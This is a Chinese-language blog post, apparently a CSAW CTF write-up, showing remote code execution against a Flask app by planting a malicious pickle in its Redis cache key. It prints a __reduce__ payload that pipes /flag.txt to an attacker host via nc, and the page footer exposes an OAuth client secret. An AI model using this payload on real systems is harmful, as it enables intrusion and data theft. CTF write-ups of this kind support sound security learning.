@@ -1,0 +1,516 @@
+<!DOCTYPE html>
+<html>
+  <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta content="yes" name="apple-mobile-web-app-capable" />
+  <meta content="black" name="apple-mobile-web-app-status-bar-style" />
+  <meta name="referrer" content="never">
+  <meta name="keywords" content="">
+  <meta name="description" content="">
+  <meta name="author" content="kveln">
+  <title>CSAWCTF Python(Cache+Redis RCE) |  </title>
+  <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
+  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
+  <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+  <link rel="alternate" type="application/rss+xml" title="CSAWCTF Python(Cache+Redis RCE) |   » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
+  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
+  <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+    <meta property="og:description" content="CSAWCTF Python(Cache+Redis RCE)"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/R9ajUO8B3/"/>
+    <meta property="og:locale" content="zh-CN"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:site_name" content=" "/>
+  </head>
+  <body>
+  	<!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand" href="https://guokeya.github.io"> </a>
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        Menu
+        <i class="fas fa-bars"></i>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/">首页</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/archives">归档</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/post/about">关于</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/tags">分类</a>
+              
+          </li>
+          
+        </ul>
+      </div>
+    </div>
+  </nav>
+  <!-- Page Header -->
+  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
+    <div class="overlay"></div>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <div class="post-heading">
+          	<span class="tags">
+          	 
+            <a href="https://guokeya.github.io/tag/CTF/" class="tag">CTF</a>
+            
+            <a href="https://guokeya.github.io/tag/Web/" class="tag">Web安全</a>
+            
+        </span>
+            <h1>CSAWCTF Python(Cache+Redis RCE)</h1>
+            <span class="meta">
+            	Posted on
+              2020-09-17，6 min read
+            </span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Post Content -->
+  <article>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <p>题目给出了源码</p>
+<pre><code>#!/usr/bin/env python3
+
+from flask import Flask
+from flask import request, redirect
+from flask_caching import Cache
+from redis import Redis
+import jinja2
+import os
+
+app = Flask(__name__)
+app.config['CACHE_REDIS_HOST'] = 'localhost'
+app.config['DEBUG'] = False
+
+cache = Cache(app, config={'CACHE_TYPE': 'redis'})
+redis = Redis('localhost')
+jinja_env = jinja2.Environment(autoescape=['html', 'xml'])
+
+
+@app.route('/', methods=['GET', 'POST'])
+def notes_post():
+    if request.method == 'GET':
+        return '''
+        &lt;h4&gt;Post a note&lt;/h4&gt;
+        &lt;form method=POST enctype=multipart/form-data&gt;
+        &lt;input name=title placeholder=title&gt;
+        &lt;input type=file name=content placeholder=content&gt;
+        &lt;input type=submit&gt;
+        &lt;/form&gt;
+        '''
+
+    print(request.form, flush=True)
+    print(request.files, flush=True)
+    title = request.form.get('title', default=None)
+    content = request.files.get('content', default=None)
+
+    if title is None or content is None:
+        return 'Missing fields', 400
+
+    content = content.stream.read()
+
+    if len(title) &gt; 100 or len(content) &gt; 256:
+        return 'Too long', 400
+
+    redis.setex(name=title, value=content, time=3)  # Note will only live for max 30 seconds
+
+    return 'Thanks!'
+
+
+# This caching stuff is cool! Lets make a bunch of cached functions.
+
+@cache.cached(timeout=3)
+def _test0():
+    return 'test'
+@app.route('/test0')
+def test0():
+    _test0()
+    return 'test'
+@cache.cached(timeout=3)
+def _test1():
+    return 'test'
+@app.route('/test1')
+def test1():
+    _test1()
+    return 'test'
+@cache.cached(timeout=3)
+def _test2():
+    return 'test'
+@app.route('/test2')
+def test2():
+    _test2()
+    return 'test'
+@cache.cached(timeout=3)
+def _test3():
+    return 'test'
+@app.route('/test3')
+def test3():
+    _test3()
+    return 'test'
+@cache.cached(timeout=3)
+def _test4():
+    return 'test'
+@app.route('/test4')
+def test4():
+    _test4()
+    return 'test'
+@cache.cached(timeout=3)
+def _test5():
+    return 'test'
+@app.route('/test5')
+def test5():
+    _test5()
+    return 'test'
+@cache.cached(timeout=3)
+def _test6():
+    return 'test'
+@app.route('/test6')
+def test6():
+    _test6()
+    return 'test'
+@cache.cached(timeout=3)
+def _test7():
+    return 'test'
+@app.route('/test7')
+def test7():
+    _test7()
+    return 'test'
+@cache.cached(timeout=3)
+def _test8():
+    return 'test'
+@app.route('/test8')
+def test8():
+    _test8()
+    return 'test'
+@cache.cached(timeout=3)
+def _test9():
+    return 'test'
+@app.route('/test9')
+def test9():
+    _test9()
+    return 'test'
+@cache.cached(timeout=3)
+def _test10():
+    return 'test'
+@app.route('/test10')
+def test10():
+    _test10()
+    return 'test'
+@cache.cached(timeout=3)
+def _test11():
+    return 'test'
+@app.route('/test11')
+def test11():
+    _test11()
+    return 'test'
+@cache.cached(timeout=3)
+def _test12():
+    return 'test'
+@app.route('/test12')
+def test12():
+    _test12()
+    return 'test'
+@cache.cached(timeout=3)
+def _test13():
+    return 'test'
+@app.route('/test13')
+def test13():
+    _test13()
+    return 'test'
+@cache.cached(timeout=3)
+def _test14():
+    return 'test'
+@app.route('/test14')
+def test14():
+    _test14()
+    return 'test'
+@cache.cached(timeout=3)
+def _test15():
+    return 'test'
+@app.route('/test15')
+def test15():
+    _test15()
+    return 'test'
+@cache.cached(timeout=3)
+def _test16():
+    return 'test'
+@app.route('/test16')
+def test16():
+    _test16()
+    return 'test'
+@cache.cached(timeout=3)
+def _test17():
+    return 'test'
+@app.route('/test17')
+def test17():
+    _test17()
+    return 'test'
+@cache.cached(timeout=3)
+def _test18():
+    return 'test'
+@app.route('/test18')
+def test18():
+    _test18()
+    return 'test'
+@cache.cached(timeout=3)
+def _test19():
+    return 'test'
+@app.route('/test19')
+def test19():
+    _test19()
+    return 'test'
+@cache.cached(timeout=3)
+def _test20():
+    return 'test'
+@app.route('/test20')
+def test20():
+    _test20()
+    return 'test'
+@cache.cached(timeout=3)
+def _test21():
+    return 'test'
+@app.route('/test21')
+def test21():
+    _test21()
+    return 'test'
+@cache.cached(timeout=3)
+def _test22():
+    return 'test'
+@app.route('/test22')
+def test22():
+    _test22()
+    return 'test'
+@cache.cached(timeout=3)
+def _test23():
+    return 'test'
+@app.route('/test23')
+def test23():
+    _test23()
+    return 'test'
+@cache.cached(timeout=3)
+def _test24():
+    return 'test'
+@app.route('/test24')
+def test24():
+    _test24()
+    return 'test'
+@cache.cached(timeout=3)
+def _test25():
+    return 'test'
+@app.route('/test25')
+def test25():
+    _test25()
+    return 'test'
+@cache.cached(timeout=3)
+def _test26():
+    return 'test'
+@app.route('/test26')
+def test26():
+    _test26()
+    return 'test'
+@cache.cached(timeout=3)
+def _test27():
+    return 'test'
+@app.route('/test27')
+def test27():
+    _test27()
+    return 'test'
+@cache.cached(timeout=3)
+def _test28():
+    return 'test'
+@app.route('/test28')
+def test28():
+    _test28()
+    return 'test'
+@cache.cached(timeout=3)
+def _test29():
+    return 'test'
+@app.route('/test29')
+def test29():
+    _test29()
+    return 'test'
+@cache.cached(timeout=3)
+def _test30():
+    return 'test'
+@app.route('/test30')
+def test30():
+    _test30()
+    return 'test'
+
+
+if __name__ == &quot;__main__&quot;:
+    app.run('0.0.0.0', 5000)
+</code></pre>
+<p>我们可以在redis中以键值存储任意数据<br>
+关键这里python还用Cache在redis中缓存了函数<br>
+。用python动态调试发现。会解析当前访问的路由<br>
+然后获取源码中定义的前缀<br>
+flask_cache_拼接<br>
+最终变成flask_cache_view//test0<br>
+<img src="https://guokeya.github.io/post-images/1600344637963.png" alt="" loading="lazy"><br>
+以这个为key。然后值是pickle反序列化的内容<br>
+<img src="https://guokeya.github.io/post-images/1600345348809.png" alt="" loading="lazy"><br>
+如果返回值是!开头。然后就会用pickle.loads。解析redis中的值<br>
+所以。直接pickle一个exp。然后以flask_cache_view//test0存入。刷行就行了</p>
+<pre><code>import pickle
+
+class Malicious:
+    def __reduce__(self):
+        return (os.system, ('cat /flag.txt | nc MYIPADDRESS 4444',))
+
+malicious_function = Malicious()
+payload = pickle.dumps(malicious_function)
+f = open('payload', 'wb')
+f.write(b'!' + payload)
+f.close()
+</code></pre>
+
+          
+          <p class="next-post">下一篇：
+            <a href="https://guokeya.github.io/post/Yd4bfDRXN/">
+              <span class="post-title">
+                Java Spring学习&rarr;
+              </span>
+            </a>
+          </p>
+        
+        <div class="comment">
+          
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<div id="gitalk-container"></div>
+<script>
+  var gitalk = new Gitalk({
+    clientID: 'c07e068ab9501a423854',
+    clientSecret: '33e8ada317c799c9a4ca5cbbb2070ff5a423903b',
+    repo: 'Message',
+    owner: 'guokeya',
+    admin: ['guokeya'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+  gitalk.render('gitalk-container')
+</script>
+
+          
+          
+        
+        </div>
+      </div>
+    </div>
+  </article>
+ <!-- Footer -->
+  <footer>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <ul class="list-inline text-center">
+            
+            
+            <li class="list-inline-item">
+              <a href="http://github.com/guokeya" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+              <li class="list-inline-item">
+              <a href="https://guokeya.github.io/atom.xml" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+              </li>
+          </ul>
+          <p class="copyright text-muted">Copyright &copy;<span> </span><br><a href="https://github.com/getgridea/gridea" class="Themeinfo">Powered by Gridea<br >浙ICP备2021000950号-1</a></p>
+        </div>
+      </div>
+    </div>
+   </footer>
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
+  <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+  <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
+<a id="back_to_top" href="#" class="back_to_top">
+  <span>▲</span></a>
+<script>$(document).ready((function(_this) {
+    return function() {
+      var bt;
+      bt = $('#back_to_top');
+      if ($(document).width() > 480) {
+        $(window).scroll(function() {
+          var st;
+          st = $(window).scrollTop();
+          if (st > 30) {
+            return bt.css('display', 'block')
+          } else {
+            return bt.css('display', 'none')
+          }
+        });
+        return bt.click(function() {
+          $('body,html').animate({
+            scrollTop: 0
+          },
+          800);
+          return false
+        })
+      }
+    }
+  })(this));</script>
+  </body>
+</html>
+
